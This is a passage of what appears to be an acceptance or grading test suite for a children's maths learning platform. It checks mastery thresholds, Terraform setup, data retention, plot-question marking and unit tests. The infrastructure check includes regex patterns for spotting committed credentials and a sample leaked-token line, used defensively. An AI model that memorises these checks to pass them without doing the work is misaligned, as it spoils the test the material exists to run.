    assert(curriculum.mastery.core === 85,
      "the curriculum payload still reports the old threshold, so something captured it at import time");
    assert(curriculum.thresholds["g6-ratios"] === 85,
      "per-topic thresholds did not follow the change");
    const after = await reviewEntry();
    assert(!after || after.reason !== "not_yet_mastered",
      "the same 85% topic is still reported as not yet mastered after the threshold moved to 85 — the setting is reported but not enforced");
    if (after) assert(after.threshold === 85,
      `the review entry still quotes a threshold of ${after.threshold}`);

    /* History must not be rewritten. The recorded run keeps the score it
       actually got; only the live judgement of "mastered" moves. A setting
       that edited past results would let an admin change what a child did. */
    const { DatabaseSync: DB } = await import("node:sqlite");
    const file = new DB("app/server/data/verify.db");
    const stored = file.prepare("SELECT pct FROM runs WHERE learner_id=? AND topic_id=?")
      .get(kid.id, "g6-ratios");
    assert(stored && stored.pct === 85,
      `the recorded run now reads ${stored && stored.pct} — changing a threshold rewrote what the child actually scored`);

    /* Out of range is refused, not silently clamped: an admin who typed 5
       meant something, and storing 50 instead leaves them believing the
       platform is doing what they asked. */
    for (const bad of [{ core: 5, adv: 80 }, { core: 90, adv: 101 }, { core: "ninety", adv: 80 },
                       { core: 87.5, adv: 80 }, { core: null, adv: 80 }]) {
      const r = await putMastery(bad);
      assert(r.status === 400, `${JSON.stringify(bad)} was accepted (${r.status})`);
    }
    assert((await c("/settings/mastery")).body.thresholds.core === 85,
      "a refused change still altered the stored threshold");

    /* Only an admin may change it; anyone signed in may read it. */
    const parent = client();
    await post(parent, "/auth/register",
      { coppaConsent: true, email: "threshold-parent@b.com", password: "a-long-enough-pass", name: "P" });
    assert((await parent("/admin/settings/mastery",
      { method: "PUT", body: JSON.stringify({ core: 50, adv: 50 }) })).status === 403,
      "a non-admin changed the mastery threshold");
    assert((await parent("/settings/mastery")).status === 200,
      "a signed-in parent cannot see the bar their child is held to");

    /* Reset returns to the documented defaults, and the change is audited. */
    const reset = await c("/admin/settings/mastery", { method: "DELETE" });
    assert(reset.status === 200 && reset.body.thresholds.core === 90,
      "reset did not restore the 90/80 defaults");
    const { DatabaseSync } = await import("node:sqlite");
    const db = new DatabaseSync("app/server/data/verify.db");
    assert(db.prepare("SELECT 1 FROM audit_log WHERE action='admin.settings.mastery'").get(),
      "changing the mastery threshold was not audited");

    return "defaults 90/80, admin-configurable within 50-100, enforced live on review and curriculum, out-of-range refused not clamped, history unchanged, admin-only and audited";
  },

  /* 11.7 — infrastructure declared as code, not typed once by hand. */
  "infrastructure-as-code": async () => {
    const { readFileSync, existsSync } = await import("node:fs");
    const { execFileSync } = await import("node:child_process");

    for (const f of ["infra/main.tf", "infra/variables.tf", "infra/outputs.tf"])
      assert(existsSync(f), `${f} is missing`);
    const tf = ["main.tf", "variables.tf", "outputs.tf"]
      .map(f => readFileSync(`infra/${f}`, "utf8")).join("\n");

    /* The volume is the product. Fly replaces a volume when an immutable
       attribute changes, and a replaced volume is an empty one — so a
       one-word edit to the region would otherwise plan the deletion of every
       learner's progress and apply it without comment. */
    assert(/resource\s+"fly_volume"/.test(tf), "no volume is declared, so the database has nowhere durable to live");
    const volumeBlock = tf.slice(tf.indexOf('resource "fly_volume"'));
    assert(/prevent_destroy\s*=\s*true/.test(volumeBlock.slice(0, 900)),
      "the database volume has no prevent_destroy guard — a region or size change would silently plan to destroy every learner's data");

    /* Scaling out is refused rather than merely discouraged: two machines
       cannot share one SQLite volume, so a second would serve a different,
       silently diverging database. */
    assert(/machine_count/.test(tf), "machine count is not declared");
    assert(/condition\s*=\s*var\.machine_count == 1/.test(tf),
      "nothing stops the machine count being raised, which would serve two diverging SQLite databases");

    /* Operating parameters that are off-by-default in code must be on in
       infrastructure: a host holding the only copy of the database with no
       backup schedule is one disk failure from total loss, and a retention
       sweep that never runs means holding data past its stated policy. */
    assert(/BACKUP_INTERVAL_HOURS/.test(tf), "backups are not configured in the infrastructure");
    assert(/condition\s*=\s*var\.backup_interval_hours > 0/.test(tf),
      "the backup interval may be set to zero, leaving the only copy of the database unbacked");
    assert(/RETENTION_SWEEP_HOURS/.test(tf), "the retention sweep is not configured in the infrastructure");

    /* No secret may be committed. The token is read from the environment and
       admin emails are a sensitive variable supplied at apply time. */
    assert(/variable "admin_emails"[\s\S]{0,300}sensitive\s*=\s*true/.test(tf),
      "admin_emails is not marked sensitive");

    /* Scan every file in infra/, not just the three .tf files, and match
       unquoted values as well as quoted ones. The first version of this
       required a quote after the "=" and so waved through
       `# FLY_API_TOKEN=fo1_realtokenvalue` in a comment — which is precisely
       the shape a leaked credential takes in practice: pasted into a comment
       or a stray tfvars file, not neatly quoted in an HCL string. */
    const { readdirSync } = await import("node:fs");
    const infraFiles = readdirSync("infra", { withFileTypes: true })
      .filter(e => e.isFile()).map(e => e.name);
    assert(!infraFiles.some(f => /\.tfvars$/.test(f)),
      `a tfvars file is committed (${infraFiles.filter(f => /\.tfvars$/.test(f))}), which is where secrets end up`);
    assert(!infraFiles.some(f => /^\.env/.test(f)), "an env file is committed under infra/");

    const secretPatterns = [
      /* Twelve credential characters, so documentation keeps working: the
         usage comment in main.tf reads `export FLY_API_TOKEN=...`, and a
         scanner that cannot tell a placeholder from a token either fires on
         every README or gets deleted for crying wolf. */
      [/\b(FLY_API_TOKEN|fly_api_token)\s*[=:]\s*["']?[A-Za-z0-9_\-]{12,}/, "a Fly API token is assigned"],
      [/\bf[om]1_[A-Za-z0-9_\-]{12,}/, "a value with a Fly token prefix appears"],
      [/\b(password|passwd|secret|api_key|apikey|access_key|private_key)\s*[=:]\s*["']?[^\s"'{$][^\s"']{7,}/i,
       "a credential is assigned a literal value"]
    ];
    for (const name of infraFiles) {
      const body = readFileSync(`infra/${name}`, "utf8");
      for (const [pattern, why] of secretPatterns) {
        const hit = body.match(pattern);
        assert(!hit, `${why} in infra/${name}: ${String(hit && hit[0]).slice(0, 60)}`);
      }
    }

    /* The deploy configs and the infrastructure must agree on the operating
       parameters, or the running system depends on which one was used. */
    const fly = readFileSync("fly.toml", "utf8");
    for (const key of ["RETENTION_SWEEP_HOURS", "BACKUP_INTERVAL_HOURS"])
      assert(fly.includes(key), `fly.toml does not set ${key}, so it would run on a different policy than the Terraform`);

    /* Blue-green is not configured, and the config has to say why rather than
       leaving it looking forgotten: it needs two live machines, which this
       single-volume SQLite deployment cannot have. */
    assert(/strategy\s*=\s*"rolling"/.test(fly), "no release strategy is declared");

    /* CI validates the infrastructure on every push. */
    const ci = readFileSync(".github/workflows/verify.yml", "utf8");
    assert(/terraform validate/.test(ci), "CI does not validate the infrastructure");
    assert(/terraform fmt -check/.test(ci), "CI does not check infrastructure formatting");

    /* And if terraform is on this machine, it must actually be valid — the
       assertions above are all structural, and structure that does not parse
       is not infrastructure. */
    let parsed = "structure only (terraform not installed here; CI validates it)";
    try {
      execFileSync("terraform", ["-version"], { stdio: "ignore" });
      execFileSync("terraform", ["init", "-backend=false", "-input=false"],
                   { cwd: "infra", stdio: "ignore" });
      execFileSync("terraform", ["validate"], { cwd: "infra", stdio: "ignore" });
      execFileSync("terraform", ["fmt", "-check"], { cwd: "infra", stdio: "ignore" });
      parsed = "terraform validate and fmt both pass";
    } catch (e) {
      if (e.code !== "ENOENT") throw new Error(`terraform rejected the infrastructure: ${e.message}`);
    }

    return `volume declared with prevent_destroy, scale-out refused, backups and retention set, no secrets committed, CI validates on every push — ${parsed}`;
  },

  /* 10.3 — the retention policy is enforced, not merely stated. */
  "retention-deletion": async () => {
    const retention = await import("../app/server/src/retention.js");
    const { db } = await import("../app/server/src/db.js");
    const { randomUUID } = await import("node:crypto");

    const DAY = 86_400_000;
    const iso = ms => new Date(ms).toISOString();
    const nowMs = Date.now();

    /* The policy the admin endpoint shows must be the policy the sweep runs
       on. Prose and behaviour drifting apart is the failure this whole
       requirement is about: retention was previously a paragraph that no
       code read. */
    const report = retention.policyReport();
    for (const key of ["sessions", "resetTokens", "auditLog", "learnerWork"])
      assert(report[key], `the policy report omits ${key}`);

    /* The description has to state the period the sweep actually enforces.

       Comparing the endpoint against policyReport() alone proves nothing —
       both read the same function, so breaking it moves both sides together
       and the assertion still passes. Checking the prose against the numeric
       constant is what catches the real drift: someone shortening the audit
       retention from 400 days to 30 and leaving the text saying 400. */
    for (const [key, rule] of Object.entries(retention.POLICY)) {
      if (rule.days === null) {
        assert(/never on a timer|deleted with/.test(rule.describe),
          `${key} is not swept on a timer but its description does not say so`);
      } else {
        assert(rule.describe.includes(String(rule.days)),
          `${key} is enforced at ${rule.days} days but its description does not mention that number: "${rule.describe}"`);
        assert(!/indefinite/i.test(rule.describe),
          `${key} is actually deleted after ${rule.days} days but is described as retained indefinitely`);
      }
    }

    /* boss@b.com is the one address withServer grants admin, so it is shared
       with whichever check registered it first. Register, and fall back to
       signing in when it already exists — assuming the account is ours makes
       this check pass alone and fail inside the suite, which is the most
       annoying kind of failure to chase. */
    const c = client();
    const admin = { email: "boss@b.com", password: "a-long-enough-pass" };
    const reg = await post(c, "/auth/register", { coppaConsent: true, name: "Admin", ...admin });
    if (reg.status !== 200) {
      const login = await post(c, "/auth/login", admin);
      assert(login.status === 200,
        `could not obtain the admin account (register ${reg.status}, login ${login.status})`);
    }
    const adminView = await c("/admin/retention");
    assert(adminView.status === 200, `admin retention endpoint returned ${adminView.status}`);
    const api = adminView.body;
    assert(api.policy && api.policy.sessions === report.sessions,
      "the admin endpoint states a different policy than the one enforced");

    /* A learner with real work, which must survive the sweep untouched. */
    const kid = (await post(c, "/learners", { name: "Retention Kid" })).body.learner;
    await post(c, "/runs",
      { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 6, total: 8 });
    const workBefore = {
      runs: db.prepare("SELECT COUNT(*) c FROM runs WHERE learner_id=?").get(kid.id).c,
      progress: db.prepare("SELECT COUNT(*) c FROM progress WHERE learner_id=?").get(kid.id).c
    };
    assert(workBefore.runs === 1 && workBefore.progress === 1, "the fixture did not record any work");

    /* Rows placed either side of each boundary, so the sweep is tested at the
       line rather than in the easy middle. */
    const uid = db.prepare("SELECT id FROM users WHERE email=?").get("boss@b.com").id;
    const seed = () => {
      const stale = randomUUID(), fresh = randomUUID();
      db.prepare("INSERT INTO sessions (id,user_id,created_at,expires_at) VALUES (?,?,?,?)")
        .run(stale, uid, iso(nowMs - 40 * DAY), iso(nowMs - 3 * DAY));      // expired 3 days ago
      db.prepare("INSERT INTO sessions (id,user_id,created_at,expires_at) VALUES (?,?,?,?)")
        .run(fresh, uid, iso(nowMs), iso(nowMs + 30 * DAY));                 // still valid
      db.prepare("INSERT INTO reset_tokens (token_hash,user_id,created_at,expires_at,used_at) VALUES (?,?,?,?,?)")
        .run("stale-" + stale, uid, iso(nowMs - 5 * DAY), iso(nowMs - 4 * DAY), null);
      db.prepare("INSERT INTO reset_tokens (token_hash,user_id,created_at,expires_at,used_at) VALUES (?,?,?,?,?)")
        .run("fresh-" + fresh, uid, iso(nowMs), iso(nowMs + DAY), null);
      db.prepare("INSERT INTO audit_log (id,user_id,action,detail,ip,at) VALUES (?,?,?,?,?,?)")
        .run(randomUUID(), uid, "ancient", null, null, iso(nowMs - 500 * DAY));
      db.prepare("INSERT INTO audit_log (id,user_id,action,detail,ip,at) VALUES (?,?,?,?,?,?)")
        .run(randomUUID(), uid, "recent", null, null, iso(nowMs - 10 * DAY));
      /* An audit row whose user no longer exists: the policy says the log
         goes with the account, and audit_log has no foreign key to enforce it. */
      db.prepare("INSERT INTO audit_log (id,user_id,action,detail,ip,at) VALUES (?,?,?,?,?,?)")
        .run(randomUUID(), "user-that-is-gone", "orphan", null, null, iso(nowMs));
      /* A system event belongs to nobody and must NOT be swept as an orphan. */
      db.prepare("INSERT INTO audit_log (id,user_id,action,detail,ip,at) VALUES (?,?,?,?,?,?)")
        .run(randomUUID(), null, "system", null, null, iso(nowMs));
      return { stale, fresh };
    };
    const { stale, fresh } = seed();

    const { removed } = retention.sweep();

    /* Past the line goes; inside the line stays. Both directions asserted,
       because a sweep that deletes everything also passes "the old row is
       gone" — and would take every live session with it. */
    assert(!db.prepare("SELECT 1 FROM sessions WHERE id=?").get(stale), "an expired session survived the sweep");
    assert(db.prepare("SELECT 1 FROM sessions WHERE id=?").get(fresh), "the sweep deleted a session that is still valid");
    assert(!db.prepare("SELECT 1 FROM reset_tokens WHERE token_hash=?").get("stale-" + stale),
      "an expired reset token survived");
    assert(db.prepare("SELECT 1 FROM reset_tokens WHERE token_hash=?").get("fresh-" + fresh),
      "the sweep deleted a reset token that has not expired");
    assert(!db.prepare("SELECT 1 FROM audit_log WHERE action='ancient'").get(),
      "an audit entry past its retention survived");
    assert(db.prepare("SELECT 1 FROM audit_log WHERE action='recent'").get(),
      "the sweep deleted an audit entry inside its retention period");
    assert(!db.prepare("SELECT 1 FROM audit_log WHERE action='orphan'").get(),
      "an audit entry for a deleted account survived");
    assert(db.prepare("SELECT 1 FROM audit_log WHERE action='system'").get(),
      "the sweep deleted a system audit entry that belongs to no account");

    /* THE property. A retention sweep that eats a child's progress is far
       worse than one that keeps data too long: the family did nothing, and a
       year of work is gone. Learner work is removed with the learner, never
       on a timer, so it must be untouched here. */
    const workAfter = {
      runs: db.prepare("SELECT COUNT(*) c FROM runs WHERE learner_id=?").get(kid.id).c,
      progress: db.prepare("SELECT COUNT(*) c FROM progress WHERE learner_id=?").get(kid.id).c
    };
    assert(workAfter.runs === workBefore.runs && workAfter.progress === workBefore.progress,
      `the sweep deleted a learner's work (runs ${workBefore.runs}->${workAfter.runs}, progress ${workBefore.progress}->${workAfter.progress})`);

    /* Sweeping again removes nothing: it is a convergent operation, so a
       daily timer cannot compound. */
    const { removed: second } = retention.sweep();
    for (const key of ["sessions", "resetTokens", "auditLog", "orphanedAudit"])
      assert(second[key] === 0, `a second sweep removed ${second[key]} more ${key} — the sweep is not idempotent`);

    /* Clean up the rows this check invented.

       The sweep removes the stale ones by design, but the deliberately-fresh
       session and reset token survive it — and another check that reads "the
       newest reset_tokens row" would then find a fixture instead of its own
       data. A check that leaves test rows in shared tables makes some other
       check fail somewhere else, which is the hardest kind of failure to
       trace back. */
    db.prepare("DELETE FROM sessions WHERE id = ?").run(fresh);
    db.prepare("DELETE FROM reset_tokens WHERE token_hash LIKE 'fresh-%' OR token_hash LIKE 'stale-%'").run();
    db.prepare("DELETE FROM audit_log WHERE action IN ('recent','ancient','system','orphan')").run();

    /* Reachable by an admin, refused to everyone else, and audited. */
    const swept = await post(c, "/admin/retention/sweep", {});
    assert(swept.status === 200 && swept.body.removed, `admin sweep failed (${swept.status})`);
    const outsider = client();
    await post(outsider, "/auth/register",
      { coppaConsent: true, email: "not-admin@b.com", password: "a-long-enough-pass", name: "N" });
    assert((await post(outsider, "/admin/retention/sweep", {})).status === 403,
      "a non-admin ran the retention sweep");
    assert(db.prepare("SELECT 1 FROM audit_log WHERE action='admin.retention.sweep'").get(),
      "the sweep was not recorded in the audit log");

    return `policy enforced not just stated: expired sessions/tokens and audit past 400 days deleted, live rows and learner work untouched, idempotent, admin-only and audited (removed ${removed.sessions + removed.resetTokens + removed.auditLog + removed.orphanedAudit} rows)`;
  },

  /* 3.2.2 — plotting points on a grid, marked server-side. */
  "plot-input": async () => {
    const { QUESTIONS } = await import("../app/shared/questions.mjs");
    const bank = QUESTIONS["g6-nscoord"];
    const plots = bank.map((q, i) => ({ q, i })).filter(o => o.q.type === "plot");
    assert(plots.length >= 4, `only ${plots.length} plot questions authored`);
    assert(plots.some(o => o.q.plotRule), "no open-ended plot question authored");
    assert(plots.some(o => o.q.ansPlot?.length > 1) || plots.length >= 4,
      "no multi-point plot question authored");

    /* Every authored plot question must be well posed: exactly one set of
       points is accepted, and the question says so. An earlier draft asked
       for "a point in Quadrant II 4 units from the y-axis" while storing a
       single answer — (-4, 1) — so a child plotting the equally correct
       (-4, 3) would have been marked wrong. Open-ended intent belongs in
       plotRule, where any satisfying answer passes; anything with a stored
       ansPlot has to be a question with one answer. */
    for (const { q, i } of plots) {
      if (q.plotRule) continue;
      assert(Array.isArray(q.ansPlot) && q.ansPlot.length >= 1,
        `g6-nscoord:${i} is a plot question with no answer`);
      assert(!/\bany\b/i.test(q.q),
        `g6-nscoord:${i} asks for "any" point but stores one exact answer — every other correct placement would be marked wrong`);
    }

    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "plot@b.com", password: "a-long-enough-pass", name: "PL" });

    /* 1. The grid is served; the answer is not. */
    const exact = plots.find(o => o.q.ansPlot && o.q.ansPlot.length === 1);
    const exactId = `g6-nscoord:${exact.i}`;
    const listed = await c("/topics/g6-nscoord/boss/questions");
    assert(listed.status === 200, `questions did not load (${listed.status})`);
    const rawServed = JSON.stringify(listed.body);
    for (const leak of ['"ansPlot"', '"plotRule"', '"expl"', '"ansP"', '"ans"'])
      assert(!rawServed.includes(leak), `a served question leaked ${leak}`);

    const servedPlot = listed.body.questions.find(q => q.type === "plot");
    assert(servedPlot, "no plot question was served at the boss tier");
    assert(servedPlot.plot && typeof servedPlot.plot.need === "number",
      "the served plot question carries no grid to answer on");
    assert(servedPlot.plot.xMin < servedPlot.plot.xMax && servedPlot.plot.yMin < servedPlot.plot.yMax,
      "the served grid has no extent");

    /* 2. Marking is order-independent, because the plane has no order.
       The rectangle question's corners can be placed in any sequence. */
    const multi = plots.find(o => o.q.ansPlot && o.q.ansPlot.length > 1);
    if (multi) {
      const id = `g6-nscoord:${multi.i}`;
      const pts = multi.q.ansPlot;
      const forward = await post(c, "/answer", { questionId: id, answer: pts });
      const reversed = await post(c, "/answer", { questionId: id, answer: [...pts].reverse() });
      assert(forward.body.correct && reversed.body.correct,
        "the same points marked differently depending on the order they were placed");
    }

    /* 3. A correct placement is accepted; a wrong one is refused. */
    const right = await post(c, "/answer", { questionId: exactId, answer: exact.q.ansPlot });
    assert(right.body.correct === true, `the stored answer was marked wrong: ${right.body.correctAnswer}`);
    const wrong = await post(c, "/answer",
      { questionId: exactId, answer: [[exact.q.ansPlot[0][0] + 1, exact.q.ansPlot[0][1]]] });
    assert(wrong.body.correct === false, "a point one unit away was marked correct");

    /* Junk must be refused rather than crash the grader — the answer arrives
       from a client and its shape cannot be assumed. */
    for (const junk of [null, "3,-2", [[1]], [["a", "b"]], [[]], 42, [[1, 2, 3, 4]], {}])
      assert((await post(c, "/answer", { questionId: exactId, answer: junk })).body.correct === false,
        `junk answer ${JSON.stringify(junk)} was marked correct`);

    /* 4. The open-ended question: infinitely many right answers, so it cannot
       be marked by comparison with a stored one. Several different correct
       placements must all pass. */
    const ruleQ = plots.find(o => o.q.plotRule);
    const ruleId = `g6-nscoord:${ruleQ.i}`;
    const { m, c: intercept, need } = ruleQ.q.plotRule;
    const onLine = x => [x, m * x + intercept];
    for (const pair of [[onLine(0), onLine(1)], [onLine(-2), onLine(2)], [onLine(1), onLine(-1)]]) {
      const r = await post(c, "/answer", { questionId: ruleId, answer: pair });
      assert(r.body.correct === true,
        `${JSON.stringify(pair)} is on the line but was marked wrong`);
    }
    /* Off the line is refused, and so is satisfying "two points" with one
       point placed twice — otherwise the question can be answered without
       ever finding a second solution. */
    assert((await post(c, "/answer", { questionId: ruleId, answer: [onLine(0), [1, 99]] })).body.correct === false,
      "a point off the line was accepted");
    assert((await post(c, "/answer", { questionId: ruleId, answer: [onLine(2), onLine(2)] })).body.correct === false,
      "the same point placed twice satisfied a two-point question");
    assert((await post(c, "/answer", { questionId: ruleId, answer: [onLine(0)] })).body.correct === false,
      `one point satisfied a ${need}-point question`);

    /* 5. Partial credit behaves like select-all: right points count for,
       wrong points count against, so covering the grid scores nothing. */
    if (multi) {
      const id = `g6-nscoord:${multi.i}`;
      const half = await post(c, "/answer", { questionId: id, answer: [multi.q.ansPlot[0]] });
      assert(half.body.credit > 0 && half.body.credit < 1,
        `a partly-right placement scored ${half.body.credit}`);
    }
    const spray = [];
    for (let x = -3; x <= 3; x++) for (let y = -3; y <= 3; y++) spray.push([x, y]);
    const sprayed = await post(c, "/answer", { questionId: exactId, answer: spray });
    assert(sprayed.body.correct === false && sprayed.body.credit === 0,
      `covering the grid in ${spray.length} points scored ${sprayed.body.credit}`);

    /* 6. The input is reachable without a mouse. The grid is the answer
         control for this type, so a click-only implementation would leave a
         child who cannot use a pointer unable to answer at all — on the very
         topic the question is assessing. */
    const { readFileSync } = await import("node:fs");
    const src = readFileSync("app/web/src/components/AnswerInput.tsx", "utf8");
    const plotSrc = src.slice(src.indexOf("export function PlotAnswer"));
    assert(/onKeyDown/.test(plotSrc), "the plot grid has no keyboard handler");
    assert(/tabIndex/.test(plotSrc), "the plot grid cannot be focused");
    for (const key of ["ArrowLeft", "ArrowRight", "ArrowUp", "ArrowDown", "Enter"])
      assert(plotSrc.includes(key), `the plot grid does not handle ${key}`);
    assert(/aria-live/.test(plotSrc), "placements are not announced to a screen reader");
    assert(/aria-label/.test(plotSrc), "the plot grid has no accessible name");
    /* The reset must key off the grid's values, not the prop object's
       identity. Depending on the object means a caller passing an inline
       `plot={{ ...q.plot }}` hands over a new reference every render, and the
       child's points are cleared underneath them mid-question — every
       placement vanishing the moment anything else on screen changes. This
       was happening, and was only visible by driving the component in a
       browser: the source reads correctly either way. */
    assert(!/\}, \[plot\]\)/.test(plotSrc),
      "the plot reset depends on the prop object's identity, so an inline plot prop wipes the child's points on every render");
    assert(/visually-hidden/.test(plotSrc) && readFileSync("app/web/src/styles.css", "utf8").includes(".visually-hidden"),
      "the live region uses a class the stylesheet does not define, so it would render on screen");

    return `${plots.length} plot questions (${plots.filter(p => p.q.plotRule).length} open-ended), order-independent marking, junk and over-plotting refused, any point on y=${m}x+${intercept} accepted, grid keyboard-operable and announced`;
  },

  /* 7.2 — summative tests across a whole unit, not one topic. */
  "unit-tests": async () => {
    const units = await import("../app/server/src/units.js");

    /* 1. Coverage is a property of the draw, not luck.

       The failure this guards against is silent: pooling a unit's banks and
       taking twelve at random can miss a topic outright — more often than it
       sounds, because the larger bank crowds out the smaller one — and the
       unit is then reported on evidence that never included it. Asserted over
       every testable unit and many draws, because a single draw passing says
       nothing about a sampling rule. */
    const testable = units.testableUnits("adv");
    assert(testable.length >= 2, `only ${testable.length} units have enough authored topics to test`);
    for (const unit of testable) {
      assert(unit.size >= units.MIN_TEST_SIZE, `${unit.key}: offered a ${unit.size}-question test`);
      for (let trial = 0; trial < 100; trial++) {
        const drawn = units.drawQuestions(unit);
        const seen = new Set(drawn.map(d => d.topicId));
        assert(seen.size === unit.topics.length,
          `${unit.key}: draw ${trial} covered ${seen.size} of ${unit.topics.length} topics`);
        assert(new Set(drawn.map(d => `${d.topicId}:${d.idx}`)).size === drawn.length,
          `${unit.key}: draw ${trial} repeated a question`);

        /* Exactly balanced, not approximately.

           Letting the rotation drain the smallest bank weights the score by
           how many questions each topic happens to have — Counting &
           Cardinality has 8 for counting and 5 for counting back, so an
           unbalanced paper is 7 against 5 and the child's unit percentage
           leans on counting for reasons that have nothing to do with either
           skill. The paper is capped at the smallest bank so every topic
           carries equal weight. */
        const counts = {};
        for (const d of drawn) counts[d.topicId] = (counts[d.topicId] || 0) + 1;
        const values = Object.values(counts);
        assert(Math.max(...values) === Math.min(...values),
          `${unit.key}: draw ${trial} weighted topics unequally (${JSON.stringify(counts)})`);
      }
    }

    /* 2. A unit with too few authored topics is refused by name, not served
       as a one-topic test dressed up as unit-level evidence. */
    const thin = units.allUnits().find(u => u.authoredCount === 1);

    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "unit@b.com", password: "a-long-enough-pass", name: "U" });
    const kid = (await post(c, "/learners", { name: "Unit Kid" })).body.learner;

    if (thin) {
      const refused = await post(c, "/unit-test/start", { learnerId: kid.id, unitKey: thin.key });
      assert(refused.status === 409, `a single-topic unit started a unit test (${refused.status})`);
      assert(/at least/.test(refused.body.message || ""),
        "the refusal does not say what the requirement is");
    }
    const unknown = await post(c, "/unit-test/start", { learnerId: kid.id, unitKey: "9:not-a-unit" });
    assert(unknown.status === 404, `an unknown unit returned ${unknown.status}`);

    /* 3. The offered list is real and track-filtered. */
    const offered = (await c(`/learners/${kid.id}/units`)).body.units;
    assert(offered.length >= 2, `only ${offered.length} units offered`);
    assert(offered.every(u => u.topics.length >= 2), "a unit with too few topics was offered");

    const target = offered.find(u => u.key.startsWith("6:")) || offered[0];
    const started = await post(c, "/unit-test/start", { learnerId: kid.id, unitKey: target.key });
    assert(started.status === 200, "unit test did not start");
    assert(started.body.questions.length === target.questionCount,
      `served ${started.body.questions.length} questions, offered ${target.questionCount}`);
    assert(started.body.threshold === 90, `core threshold was ${started.body.threshold}`);

    /* The paper served over HTTP is balanced too, not just the module's draw. */
    const servedCounts = {};
    for (const q of started.body.questions) {
      const t = q.id.split(":")[0];
      servedCounts[t] = (servedCounts[t] || 0) + 1;
    }
    assert(Math.max(...Object.values(servedCounts)) === Math.min(...Object.values(servedCounts)),
      `the served paper weighted topics unequally: ${JSON.stringify(servedCounts)}`);

    const raw = JSON.stringify(started.body.questions);
    for (const leak of ['"ans"', '"ansP"', '"expl"', '"a":', '"aMulti"', '"ansOrder"'])
      assert(!raw.includes(leak), `unit test leaked ${leak}`);

    /* The paper really does span topics, as served over HTTP and not merely
       in the module. */
    const servedTopics = new Set(started.body.questions.map(q => q.id.split(":")[0]));
    assert(servedTopics.size === target.topics.length,
      `paper covered ${servedTopics.size} of ${target.topics.length} topics`);

    /* 4. Marking is the server's, and the breakdown names the weak topic.

       One topic answered correctly throughout and the other deliberately
       wrong, so the breakdown has a known right answer to be checked against
       — a single overall percentage could not distinguish these two topics
       at all, which is the point of reporting per topic. */
    const topicIds = [...servedTopics].sort();
    const strongTopic = topicIds[0], weakTopic = topicIds[1];
    /* Answers are taken from the bank rather than round-tripped through
       /answer. The `correctAnswer` that endpoint returns is formatted for a
       child to read — ordering questions come back as "25% -> 0.4 -> 1/2" —
       so replaying it does not grade as correct, and a helper built on it
       would silently mark the "fully correct" topic at about half and make
       this check look like a marking bug. */
    const answers = {};
    for (const q of started.body.questions)
      answers[q.id] = q.id.startsWith(strongTopic + ":") ? await correctAnswerFor(q.id) : "-999999";

    const done = await post(c, "/unit-test/submit",
      { testId: started.body.testId, answers, score: 12, pct: 100, passed: true });
    assert(done.status === 200, "unit test did not submit");
    assert(done.body.pct < 100 && done.body.pct > 0,
      `a half-right paper scored ${done.body.pct}% — the client's claimed score may have been trusted`);
    assert(done.body.passed === false, "a half-right paper passed a 90% threshold");

    const parts = done.body.breakdown;
    assert(parts.length === target.topics.length, `breakdown covered ${parts.length} topics`);
    const strong = parts.find(p => p.topicId === strongTopic);
    const weak = parts.find(p => p.topicId === weakTopic);
    assert(strong.pct === 100, `the fully-correct topic scored ${strong.pct}%`);
    assert(weak.pct === 0, `the fully-wrong topic scored ${weak.pct}%`);
    assert(done.body.weakest.topicId === weakTopic, "the weakest topic was not identified");

    /* 5. A spent test cannot be resubmitted. */
    const replay = await post(c, "/unit-test/submit", { testId: started.body.testId, answers });
    assert(replay.status === 404, "a finished unit test accepted a second submission");

    /* 6. The result is stored and retrievable. */
    const history = (await c(`/learners/${kid.id}/unit-tests`)).body.tests;
    assert(history.length === 1, `history holds ${history.length} tests`);
    assert(history[0].pct === done.body.pct && history[0].breakdown.length === parts.length,
      "the stored result does not match what was returned");

    /* 7. A unit test must not masquerade as a topic.

       It is recorded in its own table precisely so the unit key never appears
       where a topic id is expected. If it were written into `runs`, every
       per-topic view — progress, time on task, the readiness signals — would
       acquire a phantom topic that is not in the curriculum. */
    const { DatabaseSync } = await import("node:sqlite");
    const db = new DatabaseSync("app/server/data/verify.db");
    const phantom = db.prepare("SELECT COUNT(*) c FROM runs WHERE topic_id = ?").get(target.key);
    assert(phantom.c === 0, `the unit test wrote ${phantom.c} run rows under a unit key`);
    const stored = db.prepare("SELECT COUNT(*) c FROM unit_tests WHERE learner_id = ?").get(kid.id);
    assert(stored.c === 1, `unit_tests holds ${stored.c} rows`);

    /* 8. Another account cannot start, submit or read this learner's tests. */
    const other = client();
    await post(other, "/auth/register",
      { coppaConsent: true, email: "unit-other@b.com", password: "a-long-enough-pass", name: "O" });
    assert((await post(other, "/unit-test/start", { learnerId: kid.id, unitKey: target.key })).status === 403,
      "another account started a unit test for someone else's learner");
    assert((await other(`/learners/${kid.id}/unit-tests`)).status === 403,
      "another account read someone else's unit test history");
    assert((await other(`/learners/${kid.id}/units`)).status === 403,
      "another account listed someone else's units");

    return `${testable.length} testable units, every topic covered in 100 draws each, single-topic units refused, server-marked with per-topic breakdown (${strongTopic} 100% vs ${weakTopic} 0%), replay blocked, no phantom topic rows`;
  },

  /* X.4 — progress survives a restart (checked by reopening the file) */
  "persistence": async () => {
    const c = client();
    /* Each setup step is asserted before the next depends on it. Without
       this the check reported "progress not written to disk" whenever
       registration or the run POST had failed for an unrelated reason —
       blaming persistence for something that never got as far as writing. */
    const reg = await post(c, "/auth/register",
      { coppaConsent: true, email: "persist@b.com", password: "a-long-enough-pass", name: "P" });
    assert(reg.status === 200, `registration failed (${reg.status}: ${JSON.stringify(reg.body)})`);
    const made = await post(c, "/learners", { name: "Persist Kid" });
    assert(made.status === 200 && made.body.learner,
      `learner not created (${made.status}: ${JSON.stringify(made.body)})`);
    const kid = made.body.learner;
    const run = await post(c, "/runs",
      { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 7, total: 8 });
    assert(run.status === 200, `recording the run failed (${run.status}: ${JSON.stringify(run.body)})`);

    const { DatabaseSync } = await import("node:sqlite");
    const db = new DatabaseSync("app/server/data/verify.db");
    const row = db.prepare("SELECT best_pct, runs FROM progress WHERE learner_id = ?").get(kid.id);

    if (!row) {
      /* Two very different faults produce a missing row, and the old message
         could not tell them apart: the write never happened, or it happened
         and this second connection cannot see it. Ask the server — which is
         the writer — and say which one it was. */
      const viaApi = await c(`/learners/${kid.id}/progress`);
